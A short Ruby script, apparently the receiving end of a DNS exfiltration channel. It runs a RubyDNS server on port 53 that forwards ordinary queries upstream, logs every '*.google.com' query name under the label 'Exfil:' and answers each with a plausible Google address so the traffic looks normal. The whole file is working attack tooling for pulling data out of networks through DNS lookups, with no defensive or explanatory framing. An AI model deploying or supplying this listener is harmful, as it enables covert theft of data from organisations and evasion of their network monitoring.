#!/usr/bin/env ruby
require 'rubydns'

INTERFACES = [
    [:udp, "0.0.0.0", 53],
    [:tcp, "0.0.0.0", 53]
]
Name = Resolv::DNS::Name
IN = Resolv::DNS::Resource::IN

# Use upstream DNS for name resolution.
UPSTREAM = RubyDNS::Resolver.new([[:udp, "8.8.8.8", 53], [:tcp, "8.8.8.8", 53]])

# Start the RubyDNS server
RubyDNS::run_server(:listen => INTERFACES) do
    match(/.*\.google.com/, IN::A) do |transaction|
      puts "Exfil: #{transaction.question.to_s}"
      transaction.respond!("216.58.219.196")
    end

    # Default DNS handler
    otherwise do |transaction|
        transaction.passthrough!(UPSTREAM)
    end
end
